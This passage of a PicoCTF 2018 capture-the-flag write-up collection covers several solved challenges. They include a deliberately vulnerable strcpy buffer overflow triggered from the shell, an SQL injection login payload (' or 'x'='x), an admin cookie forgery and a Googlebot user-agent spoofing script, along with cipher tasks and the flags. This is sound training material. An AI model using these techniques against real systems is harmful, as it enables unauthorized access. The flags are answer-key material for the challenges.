  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">FLAGSIZE_MAX</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">sigsegv_handler</span><span class="p">);</span>

  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Thanks! Received: %s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">else</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"This program takes 1 argument.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><strong>Solution</strong><br /> I initially compiled the code locally, found that <code class="language-plaintext highlighter-rouge">-fno-stack-protector</code> was<br /> required to disable stack smashing detection. Found the number of <code class="language-plaintext highlighter-rouge">a</code>s required<br /> to trigger a segfault, tried on server, nada. It required more As. I copied the<br /> binary off of the server and tried running it and thought I’d start gdb’ing it,<br /> but in the end I figured I’d try the lazy thing first:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>hxr@pico-2018-shell-1:/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631$ for i in {a..z}; do ./vuln  aaaaaaaaaaaaaaaaaaaaaaa$i; done;
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaafSegmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaalSegmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
Segmentation fault
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaasSegmentation fault
Segmentation fault
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaavSegmentation fault
Segmentation fault
Segmentation fault
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
Thanks! Received: aaaaaaaaaaaaaaaaaaaaaaazhxr@pico-2018-shell-1:/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631$
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2} </code><hr><h1 id="cryptography-150-caesar-cipher-1"> Cryptography 150: caesar cipher 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/26-cryptography-150-caesar-cipher-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is one of the older ciphers in the books, can you decrypt the message?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>picoCTF{grpqxdllaliazxbpxozfmebotlvlicmrcoCTF{grpqxdllaliazxbpxozfmebotlvlicmr}}
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>ROT3 gives flag</p><h2> Flag</h2><code> picoCTF{justagoodoldcaesarcipherwoyolfpu} </code><hr><h1 id="general-skills-150-environ"> General Skills 150: environ <a href="/CTF-writeups-public/writeups/PicoCTF_2018/27-general-skills-150-environ.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Sometimes you have to configure environment variables before executing a program. Can you find the flag we’ve hidden in an environment variable on the shell server?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>logging into the shell:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>hxr@pico-2018-shell-1:~$ env | grep pico
SECRET_FLAG=picoCTF{eNv1r0nM3nT_v4r14Bl3_fL4g_3758492}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{eNv1r0nM3nT_v4r14Bl3_fL4g_3758492} </code><hr><h1 id="cryptography-150-hertz"> Cryptography 150: hertz <a href="/CTF-writeups-public/writeups/PicoCTF_2018/28-cryptography-150-hertz.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Here’s another simple cipher for you where we made a bunch of substitutions. Can you decrypt it? Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 43324</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>when we connect to the service, we are greeted with a different text every time:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>-------------------------------------------------------------------------------
hqbjcizw xoco dw sqgc ayij - wguwzdzgzdqb_hdtxocw_ico_wqykiuyo_mpozzaowkb
-------------------------------------------------------------------------------
"poyy, tcdbho, wq jobqi ibl yghhi ico bqp fgwz aimdys owzizow qa zxo
ugqbiticzow. ugz d picb sqg, da sqg lqbz zoyy mo zxiz zxdw moibw pic,
da sqg wzdyy zcs zq loaobl zxo dbaimdow ibl xqccqcw toctozcizol us zxiz
ibzdhxcdwz-d coiyys uoydoko xo dw ibzdhxcdwz-d pdyy xiko bqzxdbj
mqco zq lq pdzx sqg ibl sqg ico bq yqbjoc ms acdobl, bq yqbjoc ms
'aidzxagy wyiko,' iw sqg hiyy sqgcwoya! ugz xqp lq sqg lq? d woo d
xiko acdjxzobol sqg-wdz lqpb ibl zoyy mo iyy zxo bopw."

dz piw db fgys, 1805, ibl zxo wtoieoc piw zxo poyy-ebqpb ibbi tikyqkbi
whxococ, midl qa xqbqc ibl aikqcdzo qa zxo omtcoww micsi aolqcqkbi.
pdzx zxowo pqclw wxo jcoozol tcdbho kiwdyd egcijdb, i mib qa xdjx
cibe ibl dmtqczibho, pxq piw zxo adcwz zq iccdko iz xoc cohotzdqb. ibbi
tkyqkbi xil xil i hqgjx aqc wqmo lisw. wxo piw, iw wxo widl, wgaaocdbj
acqm yi jcdtto; jcdtto uodbj zxob i bop pqcl db wz. tozocwugcj, gwol
qbys us zxo oydzo.

iyy xoc dbkdzizdqbw pdzxqgz orhotzdqb, pcdzzob db acobhx, ibl loydkocol
us i whicyoz-ydkocdol aqqzmib zxiz mqcbdbj, cib iw aqyyqpw:

"da sqg xiko bqzxdbj uozzoc zq lq, hqgbz (qc tcdbho), ibl da zxo
tcqwtohz qa wtobldbj ib okobdbj pdzx i tqqc dbkiydl dw bqz zqq zoccduyo,
d wxiyy uo kocs hxicmol zq woo sqg zqbdjxz uozpoob 7 ibl 10 ibbozzo
whxococ."

"xoikobw! pxiz i kdcgyobz izzihe!" cotydol zxo tcdbho, bqz db zxo
yoiwz ldwhqbhoczol us zxdw cohotzdqb. xo xil fgwz obzocol, poicdbj ib
omucqdlocol hqgcz gbdaqcm, eboo ucoohxow, ibl wxqow, ibl xil wzicw qb
xdw ucoiwz ibl i wocobo ortcowwdqb qb xdw ayiz aiho. xo wtqeo db zxiz
coadbol acobhx db pxdhx qgc jciblaizxocw bqz qbys wtqeo ugz zxqgjxz, ibl
pdzx zxo jobzyo, tizcqbdndbj dbzqbizdqb bizgciy zq i mib qa dmtqczibho
pxq xil jcqpb qyl db wqhdozs ibl iz hqgcz. xo pobz gt zq ibbi tkyqkbi,
edwwol xoc xibl, tcowobzdbj zq xoc xdw uiyl, whobzol, ibl wxdbdbj xoil,
ibl hqmtyihobzys woizol xdmwoya qb zxo wqai.

"adcwz qa iyy, loic acdobl, zoyy mo xqp sqg ico. woz sqgc acdobl'w
mdbl iz cowz," widl xo pdzxqgz iyzocdbj xdw zqbo, uoboizx zxo
tqydzoboww ibl iaaohzol wsmtizxs qa pxdhx dbldaaocobho ibl okob dcqbs
hqgyl uo ldwhocbol.
</pre></table></code></div></div><p>another example:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>-------------------------------------------------------------------------------
ntwjhzpu xchc su etmh qrzj - umbupspmpstw_nsdxchu_zhc_utrkzbrc_aocppqcukw
-------------------------------------------------------------------------------
nzrr ac suxazcr. utac eczhu zjt-wckch aswy xto rtwj dhcnsucre-xzkswj rspprc th wt atwce sw ae dmhuc, zwy wtpxswj dzhpsnmrzh pt swpchcup ac tw uxthc, s pxtmjxp s otmry uzsr zbtmp z rspprc zwy ucc pxc ozpche dzhp
tq pxc othry. sp su z oze s xzkc tq yhskswj tqq pxc udrccw zwy hcjmrzpswj pxc nshnmrzpstw. oxcwckch s qswy aeucrq jhtoswj jhsa zbtmp pxc atmpx; oxcwckch sp su z yzad, yhsffre wtkcabch sw ae utmr; oxcwckch s qswy aeucrq swktrmwpzhsre dzmuswj bcqthc ntqqsw ozhcxtmucu, zwy bhswjswj md pxc hczh tq ckche qmwchzr s accp; zwy cudcnszrre oxcwckch ae xedtu jcp umnx zw mddch xzwy tq ac, pxzp sp hcvmshcu z uphtwj athzr dhswnsdrc
pt dhckcwp ac qhta ycrsbchzpcre upcddswj swpt pxc uphccp, zwy acpxtysnzrre gwtngswj dctdrc'u xzpu tqq-pxcw, s znntmwp sp xsjx psac pt jcp pt ucz zu uttw zu s nzw. pxsu su ae umbupspmpc qth dsuptr zwy bzrr. ospx
z dxsrtutdxsnzr qrtmhsux nzpt pxhtou xsaucrq mdtw xsu uothy; s vmscpre pzgc pt pxc uxsd. pxchc su wtpxswj umhdhsuswj sw pxsu. sq pxce bmp gwco sp, zratup zrr acw sw pxcsh ycjhcc, utac psac th tpxch, nxchsux kche wczhre pxc uzac qccrswju ptozhyu pxc tnczw ospx ac.

pxchc wto su etmh swumrzh nspe tq pxc azwxzpptcu, bcrpcy htmwy be oxzhkcu zu swyszw surcu be nthzr hccqu-ntaachnc umhhtmwyu sp ospx xch umhq. hsjxp zwy rcqp, pxc uphccpu pzgc etm ozpchozhy. spu ciphcac ytowptow
su pxc bzppche, oxchc pxzp wtbrc atrc su ozuxcy be ozkcu, zwy nttrcy be bhccfcu, oxsnx z qco xtmhu dhckstmu ochc tmp tq usjxp tq rzwy. rttg zp pxc nhtoyu tq ozpch-jzfchu pxchc.

nshnmazabmrzpc pxc nspe tq z yhczae uzbbzpx zqpchwttw. jt qhta nthrczhu xttg pt ntcwpscu ursd, zwy qhta pxcwnc, be oxspcxzrr, wthpxozhy. oxzp yt etm ucc?-dtupcy rsgc usrcwp ucwpswcru zrr zhtmwy pxc ptow, upzwy pxtmuzwyu mdtw pxtmuzwyu tq athpzr acw qsicy sw tnczw hckchscu. utac rczwswj zjzswup pxc udsrcu; utac uczpcy mdtw pxc dsch-xczyu; utac rttgswj tkch pxc bmrozhgu tq uxsdu qhta nxswz; utac xsjx zrtqp sw pxc hsjjswj, zu sq uphskswj pt jcp z upsrr bcppch uczozhy dccd. bmp pxcuc zhc zrr rzwyuacw; tq occg yzeu dcwp md sw rzpx zwy drzupch-pscy pt ntmwpchu, wzsrcy pt bcwnxcu, nrswnxcy pt ycugu. xto pxcw su pxsu? zhc pxc jhccw qscryu jtwc? oxzp yt pxce xchc?

bmp rttg! xchc ntac athc nhtoyu, dznswj uphzsjxp qth pxc ozpch, zwy uccaswjre btmwy qth z yskc. uphzwjc! wtpxswj osrr ntwpcwp pxca bmp pxc ciphcacup rsasp tq pxc rzwy; rtspchswj mwych pxc uxzye rcc tq etwych ozhcxtmucu osrr wtp umqqsnc. wt. pxce amup jcp lmup zu wsjx pxc ozpch zu pxce dtuusbre nzw ospxtmp qzrrswj sw. zwy pxchc pxce upzwy-asrcu tq pxca-rczjmcu. swrzwychu zrr, pxce ntac qhta rzwcu zwy zrrceu, uphccpu zwy zkcwmcu-wthpx, czup, utmpx, zwy ocup. ecp xchc pxce zrr mwspc. pcrr ac, ytcu pxc azjwcpsn kshpmc tq pxc wccyrcu tq pxc ntadzuucu tq zrr pxtuc uxsdu zpphznp pxca pxspxch?
</pre></table></code></div></div><p>maybe a substitution cipher? we can solve these with https://quipqiup.com/ the flag is in the header of each of the outputs</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="forensics-150-hex-editor"> Forensics 150: hex editor <a href="/CTF-writeups-public/writeups/PicoCTF_2018/29-forensics-150-hex-editor.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This cat has a secret to teach you.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Flag was appended to end of <a href="./writeupfiles/hex_editor.jpg">the jpeg</a></p><h2> Flag</h2><code> picoCTF{and_thats_how_u_edit_hex_kittos_3E03e57d} </code><hr><h1 id="general-skills-150-ssh-keyz"> General Skills 150: ssh-keyz <a href="/CTF-writeups-public/writeups/PicoCTF_2018/30-general-skills-150-ssh-keyz.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> As nice as it is to use our webshell, sometimes its helpful to connect directly to our machine. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. The flag is in the ssh banner which will be displayed when you login remotely with ssh to with your username.</p><p><strong>Solution</strong><br /> Added a key to ~/.ssh/authorized_keys. Hardest part was finding the ip address with <code class="language-plaintext highlighter-rouge">curl icanhazip.com</code></p><h2> Flag</h2><code> picoCTF{who_n33ds_p4ssw0rds_38dj21} </code><hr><h1 id="web-exploitation-200-irish-name-repo"> Web Exploitation 200: Irish Name Repo <a href="/CTF-writeups-public/writeups/PicoCTF_2018/31-web-exploitation-200-irish-name-repo.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There is a website running at http://2018shell1.picoctf.com:28402 (link). Do you think you can log us in? Try to see if you can login!</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There is an admin login page vulneral to sql injection</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>username: admin
password: ' or 'x'='x
</pre></table></code></div></div><p>gives us the flag</p><h2> Flag</h2><code> picoCTF{con4n_r3411y_1snt_1r1sh_f58843c5} </code><hr><h1 id="web-exploitation-200-mr-robots"> Web Exploitation 200: Mr. Robots <a href="/CTF-writeups-public/writeups/PicoCTF_2018/32-web-exploitation-200-mr-robots.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell1.picoctf.com:40064 (link)</p><p><strong>Solution</strong><br /> Checking /robots.txt we see a disallow rule for /30de1.html which includes the flag.</p><h2> Flag</h2><code> picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_30de1} </code><hr><h1 id="web-exploitation-200-no-login"> Web Exploitation 200: No login <a href="/CTF-writeups-public/writeups/PicoCTF_2018/33-web-exploitation-200-no-login.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looks like someone started making a website but never got around to making a login, but I heard there<br /> was a flag if you were the admin. http://2018shell1.picoctf.com:39670</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>create a cooke named <code class="language-plaintext highlighter-rouge">admin</code> and set value to <code class="language-plaintext highlighter-rouge">True</code> gives the flag</p><h2> Flag</h2><code> picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c} </code><hr><h1 id="web-exploitation-200-secret-agent"> Web Exploitation 200: Secret Agent <a href="/CTF-writeups-public/writeups/PicoCTF_2018/34-web-exploitation-200-secret-agent.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Here’s a little website that hasn’t fully been finished. But I heard google gets all your info anyway. http://2018shell1.picoctf.com:53383</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The website contains a big button with the word <code class="language-plaintext highlighter-rouge">Flag</code> on it. When we click it we get the message <code class="language-plaintext highlighter-rouge">You're not google! Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</code>.</p><p><img src="writeupfiles/secretagent.png" alt="" /></p><p>Looks like it checks our user agent string to decide whether we get the flag. Changing the user agent string to something custom like <code class="language-plaintext highlighter-rouge">google</code> is not enough, so we look up the user agent strings used by the Google crawlers <a href="https://support.google.com/webmasters/answer/1061943?hl=en">link</a></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><span class="sh">'</span><span class="p">}</span>
<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://2018shell1.picoctf.com:53383/flag</span><span class="sh">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
</pre></table></code></div></div><p>which gives us the web page containing the flag:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>My New Website<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav nav-pills pull-right"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;li</span> <span class="na">role=</span><span class="s">"presentation"</span> <span class="na">class=</span><span class="s">"active"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    <span class="nt">&lt;li</span> <span class="na">role=</span><span class="s">"presentation"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/unimplemented"</span><span class="nt">&gt;</span>Sign In<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    <span class="nt">&lt;li</span> <span class="na">role=</span><span class="s">"presentation"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/unimplemented"</span><span class="nt">&gt;</span>Sign Out<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                <span class="nt">&lt;/ul&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
            <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>My New Website<span class="nt">&lt;/h3&gt;</span>
        <span class="nt">&lt;/div&gt;</span>

       <span class="c">&lt;!-- Categories: success (green), info (blue), warning (yellow), danger (red) --&gt;</span>

       <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-success alert-dismissible"</span> <span class="na">role=</span><span class="s">"alert"</span> <span class="na">id=</span><span class="s">"myAlert"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"close"</span> <span class="na">data-dismiss=</span><span class="s">"alert"</span> <span class="na">aria-label=</span><span class="s">"Close"</span><span class="nt">&gt;&lt;span</span> <span class="na">aria-hidden=</span><span class="s">"true"</span><span class="nt">&gt;</span><span class="ni">&amp;times;</span><span class="nt">&lt;/span&gt;&lt;/button&gt;</span>
         <span class="c">&lt;!-- &lt;strong&gt;Title&lt;/strong&gt; --&gt;</span> Googlebot!
           <span class="nt">&lt;/div&gt;</span>

        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"jumbotron"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"lead"</span><span class="nt">&gt;&lt;/p&gt;</span>
            <span class="nt">&lt;p</span> <span class="na">style=</span><span class="s">"text-align:center; font-size:30px;"</span><span class="nt">&gt;&lt;b&gt;</span>Flag<span class="nt">&lt;/b&gt;</span>: <span class="nt">&lt;code&gt;</span>picoCTF{s3cr3t_ag3nt_m4n_134ecd62}<span class="nt">&lt;/code&gt;&lt;/p&gt;</span>
            <span class="c">&lt;!-- &lt;p&gt;&lt;a class="btn btn-lg btn-success" href="admin" role="button"&gt;Click here for the flag!&lt;/a&gt; --&gt;</span>
            <span class="c">&lt;!-- &lt;/p&gt; --&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"footer"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span><span class="ni">&amp;copy;</span> PicoCTF 2018<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/footer&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
    <span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.close</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">myAlert</span><span class="dl">"</span><span class="p">).</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">close</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">});</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
